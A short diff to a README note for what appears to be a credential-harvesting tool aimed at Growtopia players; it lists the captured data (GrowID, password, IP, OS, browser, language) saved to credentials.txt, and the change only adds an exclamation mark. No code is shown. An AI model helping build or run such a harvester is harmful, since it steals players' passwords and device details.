@@ -1,7 +1,7 @@
 > [!NOTE]
 > Data = GrowID, password, ip, os+version, browser+version, language
 >
-> os name is not always correct
+> ! os name is not always correct
 > 
 > Saves datas to credentials.txt
 > 
